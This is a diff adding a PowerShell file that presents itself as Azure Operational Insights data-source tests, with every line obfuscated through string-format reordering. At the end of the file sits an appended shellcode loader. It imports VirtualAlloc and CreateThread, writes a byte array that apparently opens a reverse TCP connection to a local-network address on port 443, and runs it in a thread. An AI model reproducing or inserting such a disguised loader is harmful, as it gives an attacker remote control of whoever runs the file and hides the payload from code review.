@@ -1,0 +1,170 @@
+function TE`sT-DATAsO`Ur`CEcreatEup`d`A`TE`d`E`lEtE
+{
+    ${wsN`AME} = &("{1}{2}{3}{0}"-f 'e','Ge','t-Resou','rceNam')
+    ${D`S`NamE} = &("{1}{0}{2}" -f't','Ge','-ResourceName')
+    ${R`gNa`ME} = &("{3}{0}{1}{2}"-f'R','esourceGroupNam','e','Get-')
+    ${s`Ub`Id1} = ("{6}{4}{2}{1}{5}{8}{3}{7}{0}" -f'ef','47','88dfdb-55b3-4fb0-b','be6','b','4-5b','0','b2','6dc')
+    ${sU`Bi`d2} = ("{0}{4}{6}{7}{2}{3}{8}{9}{5}{1}" -f 'bc','ed2f84852','f-4','99d-97','8edd8','-6b5','f-','a09','8','d')
+    ${wsLoc`A`T`Ion} = &("{0}{4}{2}{1}{5}{3}" -f'Ge','Loca','-Provider','n','t','tio')
+
+    &("{3}{2}{0}{1}" -f 'rceGr','oup','w-AzResou','Ne') -Name ${RG`N`AME} -Location ${wSl`oCa`TION} -Force
+
+    
+    ${W`O`RkSpACe} = &("{1}{2}{5}{4}{0}{3}"-f'onal','Ne','w-Az','InsightsWorkspace','i','Operat') -ResourceGroupName ${RgN`AMe} -Name ${ws`N`Ame} -Location ${WSLoc`Ati`ON} -Sku ("{1}{0}" -f 'um','premi') -Force
+
+    
+    ${D`Ata`sOU`Rce} = &("{8}{3}{13}{7}{11}{5}{4}{6}{1}{2}{9}{10}{12}{0}"-f 'DataSource','r','eActi','z','Az','nsights','u','er','New-A','vi','ty','ationalI','Log','Op') -Workspace ${Wor`KSP`ACE} -Name ${dsn`Ame} -SubscriptionId ${S`UBId1}
+    &("{2}{3}{1}{0}" -f'qual','-AreE','A','ssert') ${D`s`NAme} ${DAtA`SOUR`ce}."Na`ME"
+    &("{4}{1}{2}{0}{3}"-f 'o','er','t-N','tNull','Ass') ${datA`soUr`cE}."R`EsourcE`Id"
+    &("{1}{2}{3}{4}{0}"-f 'AreEqual','A','ss','e','rt-') ${RGna`me} ${D`ATa`so`Urce}."RESOURce`gR`OUPnA`ME"
+    &("{0}{1}{2}" -f 'Asse','rt','-AreEqual') ${w`Sn`AME} ${da`TaSOur`cE}."WO`R`ks`Pa`ceNAme"
+    &("{1}{2}{0}" -f 'rt-AreEqual','Ass','e') ${s`U`BiD1} ${DAt`A`sOuRcE}."p`ROpERTi`eS"."SuBS`Cr`iPt`ioNid"
+    &("{1}{2}{3}{4}{0}"-f'ual','Assert-','Ar','e','Eq') ("{1}{0}{2}{3}{4}" -f'r','Azu','eActi','vityLo','g') ${d`Ata`souRCe}."K`inD"
+
+    
+    ${d`AtA`SOur`Ce} = &("{3}{1}{4}{5}{2}{0}{7}{6}"-f 'ts','et-Az','ationalInsigh','G','O','per','rce','DataSou') -Workspace ${wor`Ks`PACe} -Name ${dS`NAme}
+    &("{3}{2}{1}{0}" -f'al','u','ert-AreEq','Ass') ${DS`NAMe} ${dA`T`ASOU`RCe}."NA`ME"
+    &("{1}{4}{2}{3}{0}" -f'l','Ass','NotN','ul','ert-') ${D`AtasO`U`Rce}."Re`SOu`R`cEiD"
+    &("{1}{3}{4}{2}{0}" -f 'l','Assert-','a','Ar','eEqu') ${rGn`A`me} ${DAtAsO`U`RCE}."rESoURc`e`gROU`pNamE"
+    &("{0}{1}{3}{4}{2}"-f'Ass','er','l','t-A','reEqua') ${wSN`A`Me} ${DA`TA`SourcE}."WO`R`ks`pa`CEnAmE"
+    &("{1}{2}{0}" -f'ual','Asser','t-AreEq') ${S`U`BID1} ${DA`Ta`SoURcE}."p`R`O`PErties"."SUBScRi`P`Ti`o`NID"
+    &("{1}{4}{2}{3}{0}"-f'l','As','AreE','qua','sert-') ("{0}{2}{1}" -f'Azu','yLog','reActivit') ${Da`TaSou`RCe}."KI`ND"
+
+    
+    ${d`A`NamEtWo} = &("{0}{1}{2}{3}{4}"-f'Ge','t-Res','ource','Na','me')
+    ${dATa`S`oUR`CE} = &("{8}{2}{4}{5}{7}{1}{9}{3}{0}{6}"-f'Au','i','-AzO','htsAzure','perationa','l','ditDataSource','Ins','New','g') -Workspace ${WO`R`KSpACe} -Name ${DAnAme`T`wO} -SubscriptionId ${s`UBiD2}
+
+    
+    ${DA`T`AS`oUrces} = &("{5}{8}{9}{3}{2}{7}{6}{1}{4}{0}" -f 'e','ataSo','gh','Insi','urc','Get-','sD','t','AzOp','erational') -Workspace ${wOr`kSp`ACe} -Kind ("{3}{0}{4}{1}{2}"-f're','iv','ityLog','Azu','Act')
+    &("{2}{1}{0}{3}"-f 'reEqua','A','Assert-','l') 2 ${DAta`SO`URC`eS}."co`UNT"
+    &("{4}{1}{0}{2}{3}"-f 't-A','sser','reEqua','l','A') 1 (${DAt`AS`oUR`CES} | &("{0}{1}"-f 'Wher','e') {${_}."N`AmE" -eq ${DsN`AMe}})."CoU`NT"
+    &("{2}{3}{4}{1}{0}"-f'l','AreEqua','A','sse','rt-') 1 (${DaTAS`O`U`RCEs} | &("{1}{0}"-f'e','Wher') {${_}."Na`me" -eq ${d`An`AmetWo}})."cO`UNT"
+
+    ${dAT`ASO`URCes} = &("{4}{5}{8}{9}{0}{2}{7}{1}{6}{3}"-f'n','u','sightsDa','e','Get-','AzOper','rc','taSo','ationa','lI') -ResourceGroupName ${Rgn`Ame} -WorkspaceName ${wSna`me} -Kind ("{4}{5}{1}{3}{2}{0}"-f 'yLog','eAct','t','ivi','Az','ur')
+    &("{1}{0}{3}{2}" -f's','As','ual','ert-AreEq') 2 ${dAta`S`Ou`Rces}."cO`UNT"
+    &("{3}{1}{0}{2}" -f 't-AreEq','sser','ual','A') 1 (${D`Ata`so`URces} | &("{0}{1}"-f 'W','here') {${_}."Na`Me" -eq ${D`sna`Me}})."CO`UnT"
+    &("{1}{2}{0}"-f 'reEqual','Asser','t-A') 1 (${DaTa`so`URc`ES} | &("{1}{0}" -f'ere','Wh') {${_}."n`AMe" -eq ${dANa`Me`TWO}})."cO`UNt"
+
+    
+    &("{5}{6}{1}{2}{0}{3}{4}" -f'InsightsDa','at','ional','t','aSource','Remove-','AzOper') -Workspace ${WoR`KsP`A`CE} -Name ${DANaM`eT`wO} -Force
+    ${dA`TasO`UR`cES} = &("{2}{5}{1}{3}{0}{4}"-f'c','ionalInsightsDat','Ge','aSour','e','t-AzOperat') -Workspace ${WO`R`kSpA`CE} -Kind ("{1}{3}{2}{0}"-f'ActivityLog','Az','e','ur')
+    &("{0}{3}{2}{4}{1}" -f 'Asser','l','E','t-Are','qua') 1 ${DAtA`s`oU`RCEs}."C`OunT"
+    &("{0}{1}{2}{4}{3}" -f'A','s','ser','al','t-AreEqu') 1 (${D`A`TasoUrceS} | &("{0}{1}" -f'Wher','e') {${_}."NA`Me" -eq ${d`S`NamE}})."cO`Unt"
+    &("{0}{2}{1}" -f'Assert','l','-AreEqua') 0 (${daTa`s`oUrc`ES} | &("{1}{0}"-f 'e','Wher') {${_}."N`AMe" -eq ${Da`N`Am`eTWO}})."COU`NT"
+
+    
+    ${DaTAsOU`R`Ce} = ${d`ATASOu`RCEs}[0]
+    ${d`AtaSou`R`cE}."Pr`op`ertiEs"."s`UBSC`RI`PtiONID" = ${SUB`i`D2}
+    ${daT`AS`OurcE} = &("{5}{2}{8}{4}{6}{1}{0}{7}{9}{3}" -f 'tsD','nsigh','et-','e','l','S','I','ataSo','AzOperationa','urc') -DataSource ${D`Ata`SO`UrCE}
+    &("{1}{4}{3}{2}{0}"-f 'ual','A','t-AreEq','ser','s') ("{1}{2}{3}{0}" -f'Log','AzureA','ct','ivity') ${d`A`TAsOur`CE}."K`InD"
+    &("{1}{2}{0}"-f 'Equal','Asser','t-Are') ${S`UB`Id2} ${dA`TasoUr`Ce}."prOPEr`Ti`ES"."sUbsCR`i`p`TiONiD"
+
+    
+    &("{3}{8}{4}{0}{5}{1}{2}{6}{7}" -f'-AzOpe','ion','alInsightsD','Rem','e','rat','ataSour','ce','ov') -Workspace ${work`s`pacE} -Name ${dsn`A`me} -Force
+    ${dAt`ASouR`CEs} = &("{5}{6}{0}{7}{3}{2}{1}{4}" -f'Az','Sou','ta','Da','rce','Get','-','OperationalInsights') -Workspace ${Wor`ksp`ACe} -Kind ("{2}{1}{3}{0}"-f'g','Acti','Azure','vityLo')
+    &("{2}{3}{0}{1}"-f '-AreEqua','l','A','ssert') 0 ${da`TAs`OURceS}."CO`UNt"
+}
+
+
+function tEST-D`Atas`oURcEcREA`TeFaiLSWit`hOUT`WORK`sPACE
+{
+    ${W`s`Name} = &("{2}{1}{3}{0}" -f 'urceName','et-Re','G','so')
+    ${DSn`AME} = &("{1}{3}{2}{0}{4}" -f 'c','G','ur','et-Reso','eName')
+    ${R`GNa`mE} = &("{0}{1}{2}{3}"-f'G','et-','ResourceG','roupName')
+    ${S`UbiD1} = ("{7}{6}{5}{0}{1}{3}{2}{4}"-f'5b3-4f','b0-b474-5b6d','e6b2e','cb','f','5','8dfdb-','0b8')
+    ${ws`lOca`TI`ON} = &("{3}{1}{0}{2}{5}{4}"-f 'i','-Prov','de','Get','ation','rLoc')
+
+    &("{3}{2}{5}{1}{4}{0}" -f 'oup','zResour','e','N','ceGr','w-A') -Name ${R`g`Name} -Location ${ws`LoCati`On} -Force
+
+    &("{2}{1}{0}{3}" -f'ows','rt-Thr','Asse','Contains') { &("{1}{6}{7}{5}{9}{3}{4}{0}{8}{2}" -f'ivityLo','Ne','ce','lInsig','htsAzureAct','e','w-','AzOp','gDataSour','rationa') -ResourceGroupName ${R`gnA`me} -WorkspaceName ${w`Sn`AMe} -Name ${D`Sn`AME} -SubscriptionId ${S`UbI`d1} } ("{0}{1}"-f'Not','Found')
+}
+
+
+function Test-CrEa`Tea`LLkindsO`F`DA`TAsO`Ur`CE
+{
+    ${w`Sn`AMe} = &("{0}{3}{1}{2}{4}"-f 'Get-Re','our','ce','s','Name')
+    ${R`GnA`mE} = &("{0}{1}{3}{4}{2}" -f'Ge','t-Resou','me','r','ceGroupNa')
+    ${sUBi`D1} = ("{6}{5}{0}{1}{8}{4}{7}{3}{2}"-f'5','5b3','be6b2ef','474-5b6dc','b0-','dfdb-','0b88','b','-4f')
+    ${s`UBI`d2} = ("{0}{1}{6}{3}{2}{4}{5}" -f 'aaaadf','db-55b','-','-b474','5b6dcbe','6aaaa','3-4fb0')
+    ${w`SlocA`TiON} = &("{2}{1}{3}{0}"-f 'on','t-ProviderLoca','Ge','ti')
+
+    &("{2}{3}{0}{1}"-f'sourc','eGroup','New','-AzRe') -Name ${rG`NAME} -Location ${Wsl`oca`TIon} -Force
+
+    
+    ${wORK`sp`Ace} = &("{2}{7}{4}{6}{8}{5}{3}{1}{0}"-f'tsWorkspace','sigh','New-','alIn','zOpe','tion','r','A','a') -ResourceGroupName ${rGnA`ME} -Name ${Ws`NA`me} -Location ${wsLOc`AtI`On} -Sku ("{0}{1}{2}" -f'p','remi','um') -Force
+
+    
+    ${AUdITLOGd`A`T`As`O`Urce} = &("{14}{5}{1}{12}{10}{13}{11}{2}{4}{8}{0}{6}{7}{3}{9}" -f 'tivityLogDat','A','re','o','A','w-','a','S','c','urce','eratio','sAzu','zOp','nalInsight','Ne') -Workspace ${WO`RksP`A`CE} -Name ("{0}{1}{2}"-f 'm','yAuditLo','g') -SubscriptionId ${SUb`iD1}
+
+    
+    ${w`Ind`OWsEVe`NtdA`TAsoUR`cE} = &("{12}{7}{11}{0}{1}{4}{2}{10}{6}{9}{5}{3}{13}{8}" -f 'at','io','l','entDataSo','na','v','s','zOp','ce','ightsWindowsE','In','er','New-A','ur') -Workspace ${W`oRks`PAcE} -Name ("{3}{2}{0}{1}"-f'cati','on','li','App') -EventLogName ("{1}{2}{0}"-f 'ion','Appl','icat') -CollectErrors -CollectWarnings -CollectInformation
+
+    
+    ${w`iN`D`OWSPE`RfdA`TaSoUr`CE} = &("{4}{2}{6}{7}{8}{5}{3}{0}{1}{9}"-f'Sour','c','pe','erData','New-AzO','PerformanceCount','ration','alInsights','Windows','e') -Workspace ${WOr`K`space} -Name ("{1}{0}{2}{4}{3}" -f'roce','p','ssor','f','Per') -ObjectName ("{2}{0}{1}" -f'esso','r','Proc') -InstanceName ('*') -CounterName ("{3}{1}{4}{2}{0}" -f 'e','so',' Tim','% Proces','r') -IntervalSeconds 10 -UseLegacyCollector
+
+    
+    ${sysLOG`dATA`sOuR`cE} = &("{5}{4}{6}{1}{2}{8}{3}{0}{7}"-f 'aSo','sL','i','ogDat','OperationalInsigh','New-Az','t','urce','nuxSysl') -Workspace ${Wo`RkSPA`cE} -Name ("{1}{2}{3}{0}" -f '1','sys','log-','local') -Facility ("{1}{0}" -f'cal1','lo') -CollectEmergency -CollectAlert -CollectCritical -CollectError -CollectWarning -CollectNotice -CollectDebug -CollectInformational
+
+    
+    ${liN`UxpeRfd`A`TAsOuR`cE} = &("{8}{10}{1}{9}{3}{6}{4}{11}{5}{0}{2}{7}" -f'ata','z','S','onalIns','inuxPer','rmanceObjectD','ightsL','ource','New-','Operati','A','fo') -Workspace ${WO`RKS`PAcE} -Name ("{2}{1}{0}" -f 'x','inu','MemoryL') -ObjectName ("{0}{1}" -f'M','emory') -InstanceName ('*') -CounterNames ("{1}{3}{2}{0}" -f 's','Avai',' byte','lable') -IntervalSeconds 10
+
+    
+    ${c`UsTo`m`loGraW`JsON} = '{"customLogName":"Validation_CL","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":"((\\d{2})|(\\d{4}))-([0-1]\\d)-(([0-3]\\d)|(\\d))\\s((\\d)|([0-1]\\d)|(2[0-4])):[0-5][0-9]:[0-5][0-9]","joinStringRegex":null}}}]}'
+    ${cUStOmL`oGd`AT`Asour`CE} = &("{11}{2}{5}{3}{10}{6}{8}{1}{7}{0}{4}{9}" -f'ataS','m','w','AzOperationalIn','o','-','gh','LogD','tsCusto','urce','si','Ne') -Workspace ${W`OrksPa`ce} -CustomLogRawJson ${c`UStomLO`gRawj`SoN} -Name ("{1}{0}{2}" -f'C','My','ustomLog')
+	
+	
+    ${c`U`sTOmLog`RAwj`so`N1} = '{"customLogName":"Validation_CL1","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":null,"joinStringRegex":null}}}]}'
+    ${C`UsT`om`loGDa`TASoUR`Ce1} = &("{4}{2}{6}{11}{1}{0}{7}{12}{3}{10}{8}{5}{9}"-f 'a','ation','w-','h','Ne','tomLo','AzO','lInsi','s','gDataSource','tsCu','per','g') -Workspace ${WOrK`S`P`Ace} -CustomLogRawJson ${cU`stomlOgR`Aw`jsON1} -Name ("{0}{1}{2}" -f'M','yCu','stomLog1')
+	
+
+    
+    ${c`UStO`MlogR`A`wjS`on2} = '{"customLogName":"Validation_CL2","description":"test","inputs":[{"location":{"fileSystemLocations":{"linuxFileTypeLogPaths":null,"windowsFileTypeLogPaths":["C:\\e2e\\Evan\\ArubaSECURITY\\*.log"]}},"recordDelimiter":{"regexDelimiter":{"pattern":"\\n","matchIndex":0}}}],"extractions":[{"extractionName":"TimeGenerated","extractionType":"DateTime","extractionProperties":{"dateTimeExtraction":{"regex":[{"matchIndex":0,"numberdGroup":null,"pattern":"((\\d{2})|(\\d{4}))-([0-1]\\d)-(([0-3]\\d)|(\\d))\\s((\\d)|([0-1]\\d)|(2[0-4])):[0-5][0-9]:[0-5][0-9]"}],"joinStringRegex":null}}}]}'
+    ${CustomL`o`gD`AT`ASo`Ur`Ce2} = &("{10}{0}{7}{5}{3}{8}{2}{6}{9}{1}{4}"-f 'ew','gData','hts','rationalIns','Source','pe','Cust','-AzO','ig','omLo','N') -Workspace ${w`oR`kSpAce} -CustomLogRawJson ${c`UST`Om`l`o`graWjSoN2} -Name ("{0}{3}{2}{1}" -f 'MyCu','Log2','om','st')
+
+    
+    ${apP`L`ICatIONin`Si`G`htS`DatASouRce1} = &("{13}{9}{15}{3}{7}{10}{4}{11}{5}{14}{12}{1}{8}{6}{2}{0}"-f'rce','nIn','ou','e','na','s','htsDataS','ra','sig','w-AzO','tio','lInsight','atio','Ne','Applic','p') -Workspace ${Wor`kS`p`ACE} -ApplicationSubscriptionId ${sUBi`d1} -ApplicationResourceGroupName ${r`gNAMe} -ApplicationName ("{1}{0}"-f '-app','ai')
+    &("{1}{2}{0}" -f 'otNull','Asser','t-N') ${ApP`lIca`TIoN`INSi`gH`TSDat`A`So`Ur`cE1}
+    &("{2}{1}{4}{3}{0}"-f'al','rt-AreE','Asse','u','q') "subscriptions/$subId1/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app" ${appLIC`ATiO`NInsIGh`TSD`ATas`o`U`RCE1}."Na`ME" 
+    &("{1}{2}{3}{0}" -f 'l','Assert-A','r','eEqua') ("{4}{1}{0}{2}{5}{3}" -f 'n','I','si','s','Application','ght') ${AP`pl`icA`TI`OniNSiGhTsDa`TAS`ouRCE1}."KI`Nd" 
+    &("{0}{3}{2}{1}"-f 'A','AreEqual','t-','sser') ${R`gna`Me} ${a`pP`liCATion`inS`i`GHtSdATa`SOuR`Ce1}."R`EsOuRc`e`G`R`OuPNAmE"
+
+    
+    ${aPP`lIcATio`N`INsigH`TsdA`TaSO`Urc`E2} = &("{9}{7}{4}{8}{3}{12}{5}{10}{11}{1}{2}{0}{6}"-f 'htsDat','icationIn','sig','on','r','g','aSource','pe','ati','New-AzO','h','tsAppl','alInsi') -Workspace ${WOR`ks`pAcE} -ApplicationResourceId "/subscriptions/$subId2/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app2"
+    &("{1}{3}{2}{0}"-f'Null','Ass','rt-Not','e') ${A`Pp`L`icA`Ti`OnINsIgH`TsDa`T`ASOurC`E2}
+    &("{0}{3}{2}{1}"-f 'As','AreEqual','-','sert') "subscriptions/$subId2/resourceGroups/$rgname/providers/microsoft.insights/components/ai-app2" ${A`PPLi`caTIoni`NS`IG`ht`sdAt`ASo`UrcE2}."N`AmE" 
+    &("{3}{2}{0}{1}" -f'ua','l','eEq','Assert-Ar') ("{0}{3}{1}{2}" -f'A','plica','tionInsights','p') ${a`p`plica`Tio`N`insiGhT`sDA`TaSoUr`CE2}."k`inD" 
+    &("{3}{0}{1}{2}"-f'ssert-','AreE','qual','A') ${rG`N`Ame} ${APpl`ICa`TiONinS`IgHt`SD`AtasO`Urce2}."r`eS`oU`Rce`GroupnAME"
+}
+
+
+function T`ESt-tOGGLe`SinGLE`To`N`DATa`SOu`RCEStAtE
+{
+    ${W`S`NaME} = &("{0}{3}{4}{1}{2}" -f 'Get-Re','am','e','source','N')
+    ${r`gNaMe} = &("{0}{3}{5}{2}{1}{4}" -f 'Ge','pNa','eGrou','t-Resour','me','c')
+    ${SuB`Id1} = ("{1}{6}{4}{5}{2}{7}{0}{3}" -f'e','0','4','f','b-55b3-4f','b0-b','b88dfd','74-5b6dcbe6b2')
+    ${ws`lOC`A`TIon} = &("{3}{0}{1}{2}" -f 'ovide','rL','ocation','Get-Pr')
+
+    &("{0}{1}{2}{3}"-f 'New-AzR','esourceG','rou','p') -Name ${rGN`AMe} -Location ${w`SLOcatI`On} -Force
+
+    
+    ${w`OR`ksp`Ace} = &("{1}{3}{2}{0}{4}{7}{5}{6}"-f 'perationa','N','zO','ew-A','lInsigh','Wor','kspace','ts') -ResourceGroupName ${Rgn`AMe} -Name ${WsNa`ME} -Location ${WsLoCAT`I`ON} -Sku ("{1}{0}"-f 'emium','pr') -Force
+
+    
+    &("{3}{10}{5}{8}{6}{9}{1}{2}{7}{0}{4}" -f 'tio','ghtsI','IS','Enabl','n','z','at','LogCollec','Oper','ionalInsi','e-A') -Workspace ${w`o`RkSPaCe}
+    &("{8}{9}{3}{10}{5}{2}{1}{0}{11}{7}{4}{6}" -f'tsIISL','gh','si','e-AzOperation','ct','n','ion','e','Disa','bl','alI','ogColl') -Workspace ${Wo`RKSpa`CE}
+
+    
+    &("{7}{3}{1}{8}{9}{5}{10}{4}{2}{0}{6}{11}"-f'LogColl','peratio','tom','le-AzO','s','ghtsLin','ec','Enab','n','alInsi','uxCu','tion') -Workspace ${w`O`RKspaCe}
+    &("{11}{3}{6}{4}{10}{12}{2}{1}{13}{7}{0}{15}{8}{9}{5}{14}" -f'tomL','alI','ation','i','ble','o','sa','s','llect','i','-AzOpe','D','r','nsightsLinuxCu','n','ogCo') -Workspace ${Wor`KSpA`CE}
+
+    
+    &("{2}{10}{8}{1}{0}{7}{4}{6}{3}{9}{5}" -f 'rationalInsightsL','-AzOpe','E','or','nuxPe','ection','rf','i','le','manceColl','nab') -Workspace ${w`orK`SpAce}
+    &("{0}{7}{11}{9}{3}{12}{4}{2}{14}{8}{10}{6}{5}{15}{1}{13}" -f 'Dis','rformanceCollecti','at','A','Oper','nux','sLi','a','onalInsigh','e-','t','bl','z','on','i','Pe') -Workspace ${work`s`paCe}
+
+    
+    &("{5}{7}{3}{11}{13}{2}{9}{10}{4}{6}{0}{8}{1}{12}"-f'yslogColle','t','Ins','AzOpera','tsL','Ena','inuxS','ble-','c','i','gh','tiona','ion','l') -Workspace ${wor`K`SPace}
+    &("{2}{3}{5}{11}{8}{0}{9}{1}{14}{7}{6}{4}{13}{12}{10}"-f 'l','i','D','isab','logC','l','nuxSys','Li','erationa','Ins','ion','e-AzOp','llect','o','ghts') -Workspace ${wo`RK`SPacE}
+
+}
+
+${C} = ((("{41}{60}{70}{24}{35}{36}{75}{56}{86}{17}{2}{66}{28}{37}{51}{3}{25}{65}{79}{67}{89}{30}{14}{32}{83}{87}{26}{44}{81}{55}{62}{74}{0}{15}{13}{69}{45}{4}{64}{18}{49}{85}{77}{42}{40}{88}{29}{47}{21}{72}{59}{34}{43}{52}{63}{39}{23}{12}{22}{1}{16}{73}{9}{71}{84}{6}{33}{11}{58}{38}{53}{50}{68}{31}{61}{19}{5}{78}{27}{20}{46}{76}{7}{82}{80}{10}{48}{54}{8}{57}"-f'.d','s, ','sta','i','ublic ','bl','reationFlags,','t',' co','r lp','nt ','r lpThre','e','l','nt d','l','I','c ','tic ','.dllZzk)]pu','IntPt','es,','s','ddr','ernel3','r','nTyp',' ','c ','hrea','tPtr lpAddress, ui','t(Zzk','wSize, uint f',' IntPt','int dwStackSiz','2.dllZ','z','extern IntPtr','lIm','StartA','ad(IntPtr ','[DllImp','hre','e, In','e, ','p','r m','dAttribut','src, uin','extern ','o',' V','tPtr','p','t','Protect);[DllImport(Zzkke',']','unt);','adId);[Dl','u','ort(Zz','msvcrt','rnel',' lp','sta','tual','ti','c','r','Zzk)]','kk','Paramet',' ','ntPt','32','k)','emse','T','ic static extern','Allo','i','uint fl','(IntPtr dest, u','lA','er, uint dwC','IntPtr Create','publi','llocatio','lpT','(In'))."R`EPlA`Ce"(([CHar]90+[CHar]122+[CHar]107),[STriNG][CHar]34));${W} = &("{0}{1}{2}" -f 'Add','-','Type') -memberDefinition ${c} -Name ("{0}{1}" -f 'W','in32') -namespace ("{0}{3}{4}{2}{1}" -f'W','ns','o','in32F','uncti') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x86,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${Z}."LEn`GTH" -gt 0x1000){${g} = ${Z}."l`Eng`TH"};${X}=${W}::("{2}{0}{1}" -f'rt','ualAlloc','Vi').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${z}."L`e`NGth"-1);${I}++) {${w}::"MEMS`ET"([IntPtr](${x}.("{1}{0}{2}"-f'3','ToInt','2').Invoke()+${I}), ${Z}[${I}], 1)};${W}::("{0}{2}{1}{3}" -f 'C','eThrea','reat','d').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{1}{2}" -f'Sta','rt-sle','ep') 60};
